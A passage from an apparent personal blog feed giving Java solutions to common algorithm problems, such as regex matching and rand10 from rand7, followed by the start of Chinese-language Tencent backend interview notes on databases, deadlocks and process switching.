class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxSubArray</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">int</span> res=Integer.MIN_VALUE,cur=<span class="number">0</span>;</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">           cur=Math.max(cur+nums[i],nums[i]);</span><br><span class="line">           res=Math.max(cur,res);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> res;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="regular-expression-matching">Regular Expression Matching √</span></h2><p>Given an input string (<code>s</code>) and a pattern (<code>p</code>), implement regular expression matching with support for <code>&#39;.&#39;</code> and <code>&#39;*&#39;</code>.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39;.&#39; Matches any single character.</span><br><span class="line">&#39;*&#39; Matches zero or more of the preceding element.</span><br></pre></td></tr></table></figure><p>The matching should cover the <strong>entire</strong> input string (not partial).</p><p><strong>Note:</strong></p><ul><li><code>s</code> could be empty and contains only lowercase letters <code>a-z</code>.</li><li><code>p</code> could be empty and contains only lowercase letters <code>a-z</code>, and characters like <code>.</code> or <code>*</code>.</li></ul><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">s &#x3D; &quot;aa&quot;</span><br><span class="line">p &#x3D; &quot;a&quot;</span><br><span class="line">Output: false</span><br><span class="line">Explanation: &quot;a&quot; does not match the entire string &quot;aa&quot;.</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">s &#x3D; &quot;aa&quot;</span><br><span class="line">p &#x3D; &quot;a*&quot;</span><br><span class="line">Output: true</span><br><span class="line">Explanation: &#39;*&#39; means zero or more of the preceding element, &#39;a&#39;. Therefore, by repeating &#39;a&#39; once, it becomes &quot;aa&quot;.</span><br></pre></td></tr></table></figure><p><strong>Example 3:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">s &#x3D; &quot;ab&quot;</span><br><span class="line">p &#x3D; &quot;.*&quot;</span><br><span class="line">Output: true</span><br><span class="line">Explanation: &quot;.*&quot; means &quot;zero or more (*) of any character (.)&quot;.</span><br></pre></td></tr></table></figure><p><strong>Example 4:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">s &#x3D; &quot;aab&quot;</span><br><span class="line">p &#x3D; &quot;c*a*b&quot;</span><br><span class="line">Output: true</span><br><span class="line">Explanation: c can be repeated 0 times, a can be repeated 1 time. Therefore, it matches &quot;aab&quot;.</span><br></pre></td></tr></table></figure><p><strong>Example 5:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">s &#x3D; &quot;mississippi&quot;</span><br><span class="line">p &#x3D; &quot;mis*is*p*.&quot;</span><br><span class="line">Output: false</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isMatch</span><span class="params">(String s, String p)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> m=s.length(),n=p.length();</span><br><span class="line">        <span class="keyword">boolean</span>[][] dp=<span class="keyword">new</span> <span class="keyword">boolean</span>[m+<span class="number">1</span>][n+<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">char</span> cs[]=s.toCharArray(), cp[]=p.toCharArray();</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>]=<span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(cp[i-<span class="number">1</span>]==<span class="string">'*'</span>)dp[<span class="number">0</span>][i]=dp[<span class="number">0</span>][i-<span class="number">2</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(cs[i-<span class="number">1</span>]==cp[j-<span class="number">1</span>]||cp[j-<span class="number">1</span>]==<span class="string">'.'</span>) dp[i][j]=dp[i-<span class="number">1</span>][j-<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span>(cp[j-<span class="number">1</span>]==<span class="string">'*'</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(cp[j-<span class="number">2</span>]==cs[i-<span class="number">1</span>]||cp[j-<span class="number">2</span>]==<span class="string">'.'</span>) dp[i][j]|=dp[i-<span class="number">1</span>][j]||dp[i][j-<span class="number">1</span>]||dp[i][j-<span class="number">2</span>];</span><br><span class="line">                    <span class="keyword">else</span> dp[i][j]=dp[i][j-<span class="number">2</span>];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m][n];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1><span id="排序">排序</span></h1><h2><span id="kth-largest-element-in-an-array">Kth Largest Element in an Array √</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findKthLargest</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(k&lt;=<span class="number">0</span>||k&gt;nums.length) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        qs(nums,nums.length-k);</span><br><span class="line">        <span class="keyword">return</span> nums[nums.length-k];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">qs</span><span class="params">(<span class="keyword">int</span>[] a,<span class="keyword">int</span> k)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> lo=<span class="number">0</span>,hi=a.length-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(lo&lt;hi)&#123;</span><br><span class="line">            <span class="keyword">int</span> mid = select(a,lo,hi);</span><br><span class="line">            <span class="keyword">if</span>(k==mid) <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(k&gt;mid) lo=mid+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span> hi=mid-<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">select</span><span class="params">(<span class="keyword">int</span>[] a,<span class="keyword">int</span> lo,<span class="keyword">int</span> hi)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i=lo,j=hi,x=a[lo];</span><br><span class="line">        <span class="keyword">while</span>(i&lt;j)&#123;</span><br><span class="line">            <span class="keyword">while</span>(i&lt;j&amp;&amp;a[j]&gt;=x) j--;</span><br><span class="line">            <span class="keyword">if</span>(i&lt;j) a[i]=a[j];</span><br><span class="line">            <span class="keyword">while</span>(i&lt;j&amp;&amp;a[i]&lt;x) i++;</span><br><span class="line">            <span class="keyword">if</span>(i&lt;j) a[j]=a[i];</span><br><span class="line">        &#125;</span><br><span class="line">        a[i]=x;</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1><span id="数字">数字</span></h1><h2><span id="reverse-integer">Reverse Integer √</span></h2><p>Given a 32-bit signed integer, reverse digits of an integer.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 123</span><br><span class="line">Output: 321</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: -123</span><br><span class="line">Output: -321</span><br></pre></td></tr></table></figure><p><strong>Example 3:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 120</span><br><span class="line">Output: 21</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">reverse</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> prevRev = <span class="number">0</span> , rev= <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(x != <span class="number">0</span>)&#123;</span><br><span class="line">            rev= rev*<span class="number">10</span> + x % <span class="number">10</span>;</span><br><span class="line">            <span class="keyword">if</span>((rev - x % <span class="number">10</span>) / <span class="number">10</span> != prevRev)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            prevRev = rev;</span><br><span class="line">            x= x/<span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> rev;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="implement-rand10-using-rand7">Implement Rand10() Using Rand7()</span></h2><p>Given a function <code>rand7</code> which generates a uniform random integer in the range 1 to 7, write a function <code>rand10</code> which generates a uniform random integer in the range 1 to 10.</p><p>Do NOT use system’s <code>Math.random()</code>.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 1</span><br><span class="line">Output: [7]</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 2</span><br><span class="line">Output: [8,4]</span><br></pre></td></tr></table></figure><p><strong>Example 3:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 3</span><br><span class="line">Output: [8,1,10]</span><br></pre></td></tr></table></figure><p>Idea: <code>rand7()</code> -&gt; <code>rand49()</code> -&gt; <code>rand40()</code> -&gt; <code>rand10()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">rand10</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> result = <span class="number">40</span>;</span><br><span class="line">    <span class="keyword">while</span> (result &gt;= <span class="number">40</span>) &#123;result = <span class="number">7</span> * (rand7() - <span class="number">1</span>) + (rand7() - <span class="number">1</span>);&#125;</span><br><span class="line">    <span class="keyword">return</span> result % <span class="number">10</span> + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Summary:<br>I assume <code>rand7()</code> represents the number from <code>0</code> to <code>6</code> which is more general in Java, please refer <code>Random</code> class and <code>nextInt(int bound)</code>: <a href="https://docs.oracle.com/javase/8/docs/api/java/util/Random.html#nextInt-int-" target="_blank" rel="noopener">knock API door</a></p><ol><li>Key is <code>uniform</code></li><li><code>rand7() * rand7()</code>, <code>rand7() + rand7()</code> are not uniform because some numbers can be generated by different combinations</li><li><code>rand7() + rand7() != rand7() * 2</code> because <code>rand7() + rand7()</code> is not uniform, whereas <code>rand7() * 2</code> is uniform</li><li><code>rand7()*c</code> is uniform where <code>c</code> stands for constant integers. (But note: uniform here is meant by <strong>discrete numbers</strong>, to make the range continuously, we need to fill the gap by adding <code>randc()</code> =&gt; which then leads to OP solution)</li></ol><p>So pattern we can conclude: <code>k * randk + randk</code> is uniform.(Note for the 3rd rule, don’t mix it up with <code>(k + 1)*randk</code>)</p><p><strong>其实就是k^n(randk-1)+k^n-1(randk-1)+…+randk-1大于randM就行了</strong></p>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tencent</title>
      <link href="/2020/04/14/Tencent/"/>
      <url>/2020/04/14/Tencent/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>腾讯后台面经</p><a id="more"></a><!-- toc --><ul><li><a href="#算法题">算法题</a><ul><li><a href="#压缩算法">压缩算法</a></li><li><a href="#每k个节点翻转链表-">每K个节点翻转链表 -</a></li><li><a href="#最长不重复子串-">最长不重复子串 -</a></li></ul></li><li><a href="#数据库">数据库</a><ul><li><a href="#mysql主从复制的方式">mysql主从复制的方式</a></li><li><a href="#数据库常见死锁原因及处理">数据库常见死锁原因及处理</a></li></ul></li><li><a href="#操作系统">操作系统</a><ul><li><a href="#操作系统的fork操作带来的进程问题通信问题">操作系统的fork操作，带来的进程问题，通信问题</a></li><li><a href="#什么时候用多线程什么时候用多进程">什么时候用多线程，什么时候用多进程 √</a></li><li><a href="#线程切换和进程切换的比较">线程切换和进程切换的比较</a></li><li><a href="#为什么虚拟地址切换很慢">为什么虚拟地址切换很慢？</a></li><li><a href="#孤儿进程和僵尸进程">孤儿进程和僵尸进程 √</a></li><li><a href="#进程调度方法详细介绍">进程调度方法详细介绍 √</a></li><li><a href="#页面置换方法详细介绍">页面置换方法详细介绍 √</a></li><li><a href="#死锁">死锁</a></li></ul></li><li><a href="#计算机网络">计算机网络</a><ul><li><a href="#tcpip中的攻击">TCP/IP中的攻击</a></li><li><a href="#http10和http11的主要区别">Http1.0和Http1.1的主要区别 √</a></li><li><a href="#http11与http-20的主要区别-">http1.1与http 2.0的主要区别 -</a></li><li><a href="#rtt和rto">RTT和RTO √</a></li><li><a href="#拥塞控制">拥塞控制</a></li><li><a href="#流量控制">流量控制</a></li><li><a href="#tcp如何提供可靠数据传输">TCP如何提供可靠数据传输</a></li><li><a href="#如何区分流量控制和拥塞控制">如何区分流量控制和拥塞控制？</a></li><li><a href="#操作系统-1">操作系统</a></li><li><a href="#select-epoll-poll">select epoll poll</a></li><li><a href="#http-keep-alive与tcp-keep-alive">http keep-alive与tcp keep-alive</a></li><li><a href="#redis实习缓存同步">Redis实习缓存同步</a></li></ul></li><li><a href="#实际问题">实际问题</a><ul><li><a href="#怎么解决bug问题有用日志吗">怎么解决bug问题，有用日志吗？</a></li></ul></li><li><a href="#其他">其他</a><ul><li><a href="#哈希冲突法">哈希冲突法</a></li></ul></li></ul><!-- tocstop --><h1><span id="算法题">算法题</span></h1><h2><span id="压缩算法">压缩算法</span></h2><p>小Q想要给他的朋友发送一个神秘字符串，但是他发现字符串的过于长了，于是小Q发明了一种压缩算法对字符串中重复的部分进行了压缩，对于字符串中连续的m个相同字符串S将会压缩为<a href="m为一个整数且1<=m<=100">m|S</a>，例如字符串ABCABCABC将会被压缩为[3|ABC]，现在小Q的同学收到了小Q发送过来的字符串，你能帮助他进行解压缩么？ </p><p> <strong>输入描述:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入第一行包含一个字符串s，代表压缩后的字符串。</span><br><span class="line">S的长度&lt;&#x3D;1000;</span><br><span class="line">S仅包含大写字母、[、]、|;</span><br><span class="line">解压后的字符串长度不超过100000;</span><br><span class="line">压缩递归层数不超过10层;</span><br></pre></td></tr></table></figure><p>输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HG[3|B[2|CA]]F</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HGBCACABCACABCACAF</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">decode</span><span class="params">(String a)</span></span>&#123;</span><br><span class="line">        <span class="keyword">char</span>[] c = a.toCharArray();</span><br><span class="line">        Stack&lt;String&gt; rec =<span class="keyword">new</span> Stack();</span><br><span class="line">        Stack&lt;Integer&gt; mul=<span class="keyword">new</span> Stack();</span><br><span class="line">        <span class="keyword">int</span> multi=<span class="number">0</span>;        </span><br><span class="line">        StringBuilder tmp= <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;c.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(c[i]==<span class="string">'['</span>)&#123;</span><br><span class="line">                rec.push(tmp.toString());</span><br><span class="line">                tmp=<span class="keyword">new</span> StringBuilder();</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(c[i]==<span class="string">']'</span>)&#123;</span><br><span class="line">                StringBuilder temp = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                <span class="keyword">int</span> loop=mul.pop();</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;loop;j++)&#123;</span><br><span class="line">                    temp.append(tmp);</span><br><span class="line">                &#125;</span><br><span class="line">                tmp=<span class="keyword">new</span> StringBuilder(rec.pop()+temp);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(c[i]==<span class="string">'|'</span>)&#123;</span><br><span class="line">                mul.push(multi);</span><br><span class="line">                multi=<span class="number">0</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(c[i]&gt;=<span class="string">'0'</span>&amp;&amp;c[i]&lt;=<span class="string">'9'</span>)&#123;</span><br><span class="line">                multi=multi*<span class="number">10</span>+c[i]-<span class="string">'0'</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                tmp.append(c[i]+<span class="string">""</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> tmp.toString();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Scanner sc =<span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        String a = sc.next();</span><br><span class="line">        sc.close();        </span><br><span class="line">        System.out.println(decode(a));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="每k个节点翻转链表-">每K个节点翻转链表 -</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">reverseKGroup</span><span class="params">(ListNode head, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="keyword">null</span>) <span class="keyword">return</span> head;</span><br><span class="line">        <span class="keyword">int</span> len = calLen(head,<span class="number">0</span>);</span><br><span class="line">        ListNode dummy=<span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">        dummy.next=head;</span><br><span class="line">        <span class="keyword">int</span> cyc=len/k;</span><br><span class="line">        ListNode pre=dummy,l1=head,l2=head;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;cyc;i++)&#123;            </span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;k;j++)&#123;</span><br><span class="line">                l2=l2.next;</span><br><span class="line">            &#125;</span><br><span class="line">            ListNode next=l2.next;</span><br><span class="line">            l2.next=<span class="keyword">null</span>;</span><br><span class="line">            ListNode tmp=l1;</span><br><span class="line">            reverse(l1);</span><br><span class="line">            pre.next=l2;</span><br><span class="line">            tmp.next=next;</span><br><span class="line">            pre=tmp;</span><br><span class="line">            l1=next;</span><br><span class="line">            l2=next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummy.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">calLen</span><span class="params">(ListNode head,<span class="keyword">int</span> res)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="keyword">null</span>) <span class="keyword">return</span> res;</span><br><span class="line">        <span class="keyword">return</span> calLen(head.next,res+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reverse</span><span class="params">(ListNode root)</span></span>&#123;</span><br><span class="line">        ListNode head=<span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">while</span>(root!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            ListNode tmp = root.next;</span><br><span class="line">            root.next=head.next;</span><br><span class="line">            head.next=root;</span><br><span class="line">            root=tmp;</span><br><span class="line">        &#125;       </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="最长不重复子串-">最长不重复子串 -</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        HashMap&lt;Character,Integer&gt; map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        <span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>,res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">char</span>[] c=s.toCharArray();</span><br><span class="line">        <span class="keyword">while</span>(i&lt;s.length())&#123;</span><br><span class="line">          <span class="keyword">if</span>(map.containsKey(c[i]))&#123;</span><br><span class="line">              j=Math.max(j,map.get(c[i])+<span class="number">1</span>);              </span><br><span class="line">          &#125;</span><br><span class="line">            map.put(c[i],i);</span><br><span class="line">            res=Math.max(res,i-j+<span class="number">1</span>);</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1><span id="数据库">数据库</span></h1><h2><span id="mysql主从复制的方式">mysql主从复制的方式</span></h2><ul><li>基于 SQL 语句的复制(statement-based replication, SBR)；</li><li>基于行的复制(row-based replication, RBR)；</li><li>混合模式复制(mixed-based replication, MBR)；</li></ul><h2><span id="数据库常见死锁原因及处理">数据库常见死锁原因及处理</span></h2><p><strong>一. 事务之间对资源访问顺序的交替</strong></p><ol><li>出现原因：<br>一个用户A 访问表A（锁住了表A），然后又访问表B；另一个用户B 访问表B（锁住了表B），然后企图访问表A；这时用户A由于用户B已经锁住表B，它必须等待用户B释放表B才能继续，同样用户B要等用户A释放表A才能继续，这就死锁就产生了。</li><li>解决方法：<br>这种死锁比较常见，是由于程序的BUG产生的，除了调整的程序的逻辑没有其它的办法。仔细分析程序的逻辑，对于数据库的多表操作时，尽量按照相同的顺序进行处理，尽量避免同时锁定两个资源，如操作A和B两张表时，总是按先A后B的顺序处理， 必须同时锁定两个资源时，要保证在任何时刻都应该按照相同的顺序来锁定资源。</li></ol><p>1）以固定的顺序访问表和行。即按顺序申请锁，这样就不会造成互相等待的场面。</p><p>2）大事务拆小。大事务更倾向于死锁，如果业务允许，将大事务拆小。</p><p>3）在同一个事务中，尽可能做到一次锁定所需要的所有资源，减少死锁概率。</p><p>4）降低隔离级别。如果业务允许，将隔离级别调低也是较好的选择，比如将隔离级别从RR调整为RC，可以避免掉很多因为gap锁造成的死锁。</p><p>5）为表添加合理的索引。如果不走索引将会为表的每一行记录添加上锁，死锁的概率大大增大。</p><h1><span id="操作系统">操作系统</span></h1><h2><span id="操作系统的fork操作带来的进程问题通信问题">操作系统的fork操作，带来的进程问题，通信问题</span></h2><ul><li>fork（）函数通过系统调用创建一个与原来进程几乎完全相同的进程，也就是两个进程可以做完全相同的事，但如果初始参数或者传入的变量不同，两个进程也可以做不同的事。</li></ul><h2><span id="什么时候用多线程什么时候用多进程">什么时候用多线程，什么时候用多进程 √</span></h2><p>多进程——计算密集型：大量消耗CPU的数学与逻辑运算，也就是我们这里说的平行计算。</p><p>多线程——IO密集型：读取文件，读取网络套接字频繁。</p><h2><span id="线程切换和进程切换的比较">线程切换和进程切换的比较</span></h2><p>线程切换 与 进程切换的比较。进程切换分为两步：</p><p><strong>1）切换虚拟地址</strong></p><p><strong>2）切换内核栈和硬件上下文</strong>。</p><p>线程只有一步：<strong>切换内核栈和硬件上下文</strong>。  </p><p><strong>切换页目录的开销很大。</strong> </p><h2><span id="为什么虚拟地址切换很慢">为什么虚拟地址切换很慢？</span></h2><p>每个进程都有自己的虚拟地址空间，每个进程都有自己的页表。 